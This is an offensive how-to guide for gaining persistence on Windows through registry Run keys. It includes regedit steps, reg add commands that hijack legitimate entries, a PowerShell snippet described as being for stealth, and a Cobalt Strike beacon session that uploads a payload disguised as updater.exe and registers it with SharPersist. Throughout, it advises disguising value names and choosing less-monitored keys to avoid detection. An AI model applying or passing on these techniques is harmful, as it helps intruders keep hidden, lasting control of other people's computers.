---
legal-banner: true
---

### **ESTABLISHING PERSISTENCE USING REGISTRY KEYS**

Using the Windows Registry for persistence involves creating or modifying registry keys that instruct Windows to automatically execute specific programs or scripts at certain events, like system startup or user logon.

### **STEP 1: SELECT THE APPROPRIATE REGISTRY KEY**

Depending on the persistence requirement (system-wide or user-specific), choose the appropriate registry location:

1.  For all users (requires administrative privileges) :  
    `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
    
2.  For the current user only:  
    `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
    
3.  Ensure the executable or script is reliable and placed in a secure, accessible location. It should not require additional prompts or permissions that might hinder its execution.
    

### **STEP 2: ADD A REGISTRY ENTRY**

1.  Open the Registry Editor: Press `Win + R`, type `regedit`, and press Enter. Ensure you have the necessary permissions to modify the registry.
    
2.  Navigate to the appropriate key
    
3.  For system-wide execution, navigate to  
    `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`.
    
4.  For current user execution, navigate to  
    `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`.
    
5.  Create a new string value
    
6.  Right-click in the right pane, select  
    `New` > `String Value`.
    
7.  Name the new string value descriptively to disguise its purpose (e.g., `SystemHelper`).
    
8.  Set the value of the new entry:
    
9.  Double-click the new string value and enter the path to your executable or script as the value data. For example:  
    `C:\Path\To\Your\Executable.exe`
    

### **STEP 3: TEST THE PERSISTENCE**

1.  Restart Your Computer or log out and then log back in (if using HKEY_CURRENT_USER) to test if the setup works.
2.  Verify Execution: After logging back in or restarting, check if your program or script runs automatically.
3.  Remove or Disable the Registry Entry When No Longer Needed:  
    `reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SystemHelper /f`

### **TECHNIQUE 1: USING ALTERNATE REGISTRY PATHS**

Some applications use specific registry paths to configure auto-start settings. You can place your persistence mechanism in less commonly monitored registry paths.

1.  Identify Custom Registry Keys: Applications may use custom registry keys for auto-start. Identify these through documentation or by monitoring application installations.
2.  Example: Instead of the standard Run keys, you might use:  
    `HKEY_CURRENT_USER\Software\Classes\clsid\{GUID}\shell\open\command`
3.  Place your executable path here to trigger it when the application linked to the GUID is invoked.

### **TECHNIQUE 2: REGISTRY KEY HIJACKING**

Modify existing legitimate registry keys to include your persistence payload, which can be particularly stealthy.

1.  Find Vulnerable Keys: Use a registry scanner to find legitimate keys that auto-start programs, services, or drivers that frequently update or change.  
    `Find legitimate keys that auto-start programs, services, or drivers that frequently update or change.`
    
2.  Append or Modify the Executable Path:  
    `reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "LegitimateService" /d "C:\Path\To\Your\Executable.exe && original_command.exe" /f`
    

### **TECHNIQUE 3: USING WINDOWS POWERSHELL REGISTRY MANIPULATION FOR STEALTH**

Manipulate registry keys using PowerShell to leave fewer traces and utilize more complex logic.

1.  Develop a Script: Use PowerShell's ability to script complex conditions, check for user activity, or system states before modifying the registry.
    
    ```POWERSHELL
    If ((Get-Process -Name explorer -ErrorAction SilentlyContinue) -ne $null) {
      Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\Path\To\Script.ps1"
    }
    ```
    

### **COBALTSTRIKE**

AutoRun values in HKCU and HKLM allow applications to start on boot. You commonly see these to start native and 3rd party applications such as software updaters, download assistants, driver utilities and so on.

```
beacon> cd C:\ProgramData
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add

[*] INFO: Adding registry persistence
[*] INFO: Command: C:\ProgramData\Updater.exe
[*] INFO: Command Args: /q /n
[*] INFO: Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
[*] INFO: Registry Value: Updater
[*] INFO: Option: 
[+] SUCCESS: Registry persistence added
Where:
```

-k is the registry key to modify.
-v is the name of the registry key to create.